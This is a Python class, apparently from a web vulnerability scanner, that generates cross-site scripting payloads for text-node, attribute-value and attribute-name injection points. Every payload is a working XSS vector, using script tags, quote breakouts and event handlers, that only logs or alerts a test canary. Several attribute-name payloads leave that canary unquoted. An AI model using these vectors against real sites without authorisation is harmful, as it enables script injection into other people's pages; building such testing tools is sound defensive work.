class PayloadGenerator:
    def __init__(self):
        # Unique sentinel value to verify reflection in the response
        self.canary = "XSS_TEST_123" 

    def generate_payloads(self, context):
        """
        Generates context-specific payloads based on the injection position.
        Args:
            context (str): The context type (text_node, attribute_value, attribute_name).
        Returns:
            list: A list of payload strings.
        """
        payloads = []
        
        # Standard exploit payload proving execution capability
        exploit_code = f"<script>console.log('{self.canary}')</script>"

        # Context 1: HTML Text Node (e.g., <div> USER_INPUT </div>)
        if context == 'text_node':
            payloads.append(f"{exploit_code}")
            payloads.append(f"<b>{self.canary}</b>") 

        # Context 2: Attribute Value (e.g., <input value="USER_INPUT">)
        # Strategy: Break out of the attribute quotes first
        elif context == 'attribute_value':
            payloads.append(f"\">{exploit_code}")
            payloads.append(f"' onmouseover='alert(\"{self.canary}\")") 
            payloads.append(f"\" autofocus onfocus=\"alert('{self.canary}')") 

        # Context 3: Attribute Name (e.g., <div USER_INPUT="something">)
        # Strategy: Inject a new event handler attribute
        elif context == 'attribute_name':
            payloads.append(f"style=animation-name:rotation onanimationstart=alert({self.canary}) x")
            payloads.append(f"onmouseover=alert({self.canary}) x") 

        # Fallback for unknown contexts
        else:
            payloads.append(f"{exploit_code}")
            payloads.append(f"\">{exploit_code}")
        
        return payloads

    def get_canary(self):
        return self.canary